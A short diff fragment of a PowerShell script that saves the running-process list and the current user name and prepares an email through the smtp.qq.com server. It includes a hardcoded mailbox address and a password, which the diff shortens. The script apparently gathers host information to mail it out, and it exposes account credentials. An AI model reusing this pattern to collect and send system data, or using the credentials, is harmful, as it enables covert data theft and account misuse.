@@ -2,7 +2,7 @@ get-process >> process.txt
 $whoami = whoami
 $smtpServer = "smtp.qq.com"
 $smtpUser = "hk_snow@qq.com"
-$smtpPassword = "vnkaewsoxhjkeafg"
+$smtpPassword = "vnkaews"
 #create the mail message
 $mail = New-Object System.Net.Mail.MailMessage
 #set the addresses
